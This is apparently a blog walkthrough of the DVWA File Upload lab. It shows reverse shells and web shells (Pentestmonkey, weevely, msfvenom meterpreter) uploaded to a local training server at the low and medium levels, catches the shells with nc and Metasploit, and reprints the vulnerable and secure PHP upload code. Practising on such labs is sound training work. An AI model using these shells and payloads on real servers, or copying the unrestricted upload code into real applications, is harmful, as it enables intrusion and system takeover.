---
title: DVWA - File Upload
date: 2023-12-10
categories: [DVWA, File Upload]
tags: [dvwa, file-upload, burp-suite,]
img_path: /assets/dvwa/file_upload
published: true
---

## Information

- [How to install dvwa on Kali](https://www.kali.org/tools/dvwa/).
- [Official GitHub repository](https://github.com/digininja/DVWA).

> The DVWA server itself contains instructions about almost everything.

_**Damn Vulnerable Web Application (DVWA)** is a PHP/MySQL web application that is damn vulnerable. Its main goal is to be an aid for security professionals to test their skills and tools in a legal environment, help web developers better understand the processes of securing web applications and to aid both students & teachers to learn about web application security in a controlled class room environment._

_The aim of DVWA is to practice some of the most common web vulnerabilities, with various levels of difficultly, with a simple straightforward interface._

![](dvwa_home.png){: width='70%' }

The DVWA server has **4 different security levels** which can be set as seen below:

![](security_levels.png){: width='70%' }

- **Low**: This security level is completely vulnerable and has no security measures at all. It's use is to be as an example of how web application vulnerabilities manifest through bad coding practices and to serve as a platform to teach or learn basic exploitation techniques.
- **Medium**: This setting is mainly to give an example to the user of bad security practices, where the developer has tried but failed to secure an application. It also acts as a challenge to users to refine their exploitation techniques.
- **High**: This option is an extension to the medium difficulty, with a mixture of harder or alternative bad practices to attempt to secure the code. The vulnerability may not allow the same extent of the exploitation, similar in various Capture The Flags (CTFs) competitions.
- **Impossible**: This level should be secure against all vulnerabilities. It is used to compare the vulnerable source code to the secure source code.

## File Upload

Uploaded files represent a significant risk to web applications. The first step in many attacks is to get some code to the system to be attacked. Then the attacker only needs to find a way to get the code executed. Using a file upload helps the attacker accomplish the first step.

The consequences of unrestricted file upload can vary, including complete system takeover, an overloaded file system, forwarding attacks to backend systems, and simple defacement. It depends on what the application does with the uploaded file, including where it is stored.

**Objective**: Execute any PHP function of your choosing on the target system (such as `phpinfo()`	or `system()`) thanks to this file upload vulnerability.

> If you get the "**The PHP module GD is not installed**" check the solution [here](https://youtu.be/K7XBQWAZdZ4).

## Security: Low

> _Low level will not check the contents of the file being uploaded in any way. It relies only on trust._

```php
# source code for low security
<?php

if( isset( $_POST[ 'Upload' ] ) ) {
    // Where are we going to be writing to?
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

    // Can we move the file to the upload folder?
    if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {
        // No
        echo '<pre>Your image was not uploaded.</pre>';
    }
    else {
        // Yes!
        echo "<pre>{$target_path} succesfully uploaded!</pre>";
    }
}

?> 
```

1. Let grab [Pentestmonkey's PHP reverse shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php) and make the required changes:

    ![](shell_script.png)

2. Upload the file on the webserver:

    ![](shell_upload.png)

3. Set up a listener:

    ```shell
    shell
    nc -lvnp 9999
    listening on [any] 9999 ...
    ```

4. Visit the given path:

    ```shell
    curl http://127.0.0.1:42001/../../hackable/uploads/php-reverse-shell.php
    ```

5. Check listener:

    ```shell
    nc -lvnp 9999
    listening on [any] 9999 ...
    connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 39452
    Linux CSpanias 5.15.133.1-microsoft-standard-WSL2 #1 SMP Thu Oct 5 21:02:42 UTC 2023 x86_64 GNU/Linux
    08:37:32 up 59 min,  1 user,  load average: 0.00, 0.02, 0.04
    USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
    kali     pts/1    -                07:37   59:46   0.00s   ?    -bash
    uid=149(_dvwa) gid=156(_dvwa) groups=156(_dvwa)
    /bin/sh: 0: can't access tty; job control turned off
    $
    ```

> If this was a remote webserver, and not hosted on our PC, we would gain access to the actual webserver where we could further enumerate the network, pivot, or perform privilege escalation.

### Weevely3

We can also use [`weevely3`](https://github.com/epinna/weevely3) to get a reverse shell.

1. Generate the shell:

    ```shell
    ./weevely.py generate test123 ~/dvwa/weevely.php
    Generated '/home/kali/dvwa/weevely.php' with password 'test123' of 688 byte size.
    ```

2. Upload it to the webserver:

    ![](weevely_upload.png){: width='75%'}

3. Call it through the terminal:

    ```shell
     sudo /opt/weevely3/weevely.py http://127.0.0.1:42001/hackable/uploads/weevely.php test123
    [+] weevely 4.0.1

    [+] Target:     127.0.0.1:42001
    [+] Session:    /root/.weevely/sessions/127.0.0.1/weevely_0.session

    [+] Browse the filesystem or execute commands starts the connection
    [+] to the target. Type :help for more information.

    weevely> ls
    dvwa_email.png
    php-reverse-shell.php
    php-reverse-shell.php.png
    weevely.php
    ```

### MSFVenom

1. We can also craft our own payload with `msfvenom`:

    ```shell
    msfvenom -p php/meterpreter/reverse_tcp lhost=127.0.0.1 lport=4444 -f raw > revshell.php
    [-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
    [-] No arch selected, selecting arch: php from the payload
    No encoder specified, outputting raw payload
    Payload size: 1110 bytes
    ```

    ![](msfvenom_payload.png)

2. Upload the file:

    ![](msfvenom_uploaded.png)

3. Set up the a listener within `msfconsole`:

```shell
msfconsole -q
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
payload => php/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost 127.0.0.1
lhost => 127.0.0.1
msf6 exploit(multi/handler) >
msf6 exploit(multi/handler) > run

[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
[*] Started reverse TCP handler on 127.0.0.1:4444
```

4. Call the uploaded `msfvenom` payload:

    ```shell
    curl http://127.0.0.1:42001/hackable/uploads/revshell.php
    ```

5. Catch the reverse shell:

    ```shell
    msf6 exploit(multi/handler) > run

    [!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
    [*] Started reverse TCP handler on 127.0.0.1:4444
    [*] Sending stage (39927 bytes) to 127.0.0.1
    [*] Meterpreter session 1 opened (127.0.0.1:4444 -> 127.0.0.1:46378) at 2023-12-10 13:31:06 +0000

    meterpreter >
    ```

6. As an extra step, we could then use one of the MSF's post-exploitation modules, such as the [Local Exploit Suggester](https://www.rapid7.com/blog/post/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/), to check our options for lateral movement, privilege escalation, crendential gathering, etc.

    ```shell
    meterpreter > bg
    [*] Backgrounding session 1...
    msf6 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
    msf6 post(multi/recon/local_exploit_suggester) > show options

    Module options (post/multi/recon/local_exploit_suggester):

    Name             Current Setting  Required  Description
    ----             ---------------  --------  -----------
    SESSION                           yes       The session to run this module on
    SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits


    View the full module info with the info, or info -d command.

    msf6 post(multi/recon/local_exploit_suggester) > set session 1
    session => 1
    msf6 post(multi/recon/local_exploit_suggester) > run

    [*] 127.0.0.1 - Collecting local exploits for php/linux...
    ```

## Security: Medium

> _When using the medium level, it will check the reported file type from the client when its being uploaded._

```php
# source code for medium security
<?php

if( isset( $_POST[ 'Upload' ] ) ) {
    // Where are we going to be writing to?
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

    // File information
    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
    $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ];
    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];

    // Is it an image?
    if( ( $uploaded_type == "image/jpeg" || $uploaded_type == "image/png" ) &&
        ( $uploaded_size < 100000 ) ) {

        // Can we move the file to the upload folder?
        if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {
            // No
            echo '<pre>Your image was not uploaded.</pre>';
        }
        else {
            // Yes!
            echo "<pre>{$target_path} succesfully uploaded!</pre>";
        }
    }
    else {
        // Invalid file
        echo '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>';
    }
}

?> 
```

1. When trying to upload the same script to the webserver we fail as it only accepts `JPEG` or `PNG` images: 

    ![](medium_failed_upload.png)

2. Intercept the traffic with Burp when uploading the file and change the [MIME type](https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types/Common_types):

    ![](mime-type_php.png)

    ![](medium_burp_content-type.png)

3. Since the file has been uploaded, we can follow the same procedure as above to catch the reverse shell.

## Security: High

> _Once the file has been received from the client, the server will try to resize any image that was included in the request._

```php
# source code for high security
<?php

if( isset( $_POST[ 'Upload' ] ) ) {
    // Where are we going to be writing to?
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

    // File information
    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1);
    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];
    $uploaded_tmp  = $_FILES[ 'uploaded' ][ 'tmp_name' ];

    // Is it an image?
    if( ( strtolower( $uploaded_ext ) == "jpg" || strtolower( $uploaded_ext ) == "jpeg" || strtolower( $uploaded_ext ) == "png" ) &&
        ( $uploaded_size < 100000 ) &&
        getimagesize( $uploaded_tmp ) ) {

        // Can we move the file to the upload folder?
        if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) {
            // No
            echo '<pre>Your image was not uploaded.</pre>';
        }
        else {
            // Yes!
            echo "<pre>{$target_path} succesfully uploaded!</pre>";
        }
    }
    else {
        // Invalid file
        echo '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>';
    }
}

?> 
```


## Security: Impossible

> _This will check everything from all the levels so far, as well then to re-encode the image. This will make a new image, therefor stripping any "non-image" code (including metadata)._

```php
# source code for impossible security
<?php

if( isset( $_POST[ 'Upload' ] ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );


    // File information
    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1);
    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];
    $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ];
    $uploaded_tmp  = $_FILES[ 'uploaded' ][ 'tmp_name' ];

    // Where are we going to be writing to?
    $target_path   = DVWA_WEB_PAGE_TO_ROOT . 'hackable/uploads/';
    //$target_file   = basename( $uploaded_name, '.' . $uploaded_ext ) . '-';
    $target_file   =  md5( uniqid() . $uploaded_name ) . '.' . $uploaded_ext;
    $temp_file     = ( ( ini_get( 'upload_tmp_dir' ) == '' ) ? ( sys_get_temp_dir() ) : ( ini_get( 'upload_tmp_dir' ) ) );
    $temp_file    .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . '.' . $uploaded_ext;

    // Is it an image?
    if( ( strtolower( $uploaded_ext ) == 'jpg' || strtolower( $uploaded_ext ) == 'jpeg' || strtolower( $uploaded_ext ) == 'png' ) &&
        ( $uploaded_size < 100000 ) &&
        ( $uploaded_type == 'image/jpeg' || $uploaded_type == 'image/png' ) &&
        getimagesize( $uploaded_tmp ) ) {

        // Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD)
        if( $uploaded_type == 'image/jpeg' ) {
            $img = imagecreatefromjpeg( $uploaded_tmp );
            imagejpeg( $img, $temp_file, 100);
        }
        else {
            $img = imagecreatefrompng( $uploaded_tmp );
            imagepng( $img, $temp_file, 9);
        }
        imagedestroy( $img );

        // Can we move the file to the web root from the temp folder?
        if( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) {
            // Yes!
            echo "<pre><a href='${target_path}${target_file}'>${target_file}</a> succesfully uploaded!</pre>";
        }
        else {
            // No
            echo '<pre>Your image was not uploaded.</pre>';
        }

        // Delete any temp files
        if( file_exists( $temp_file ) )
            unlink( $temp_file );
    }
    else {
        // Invalid file
        echo '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>';
    }
}

// Generate Anti-CSRF token
generateSessionToken();

?> 
```

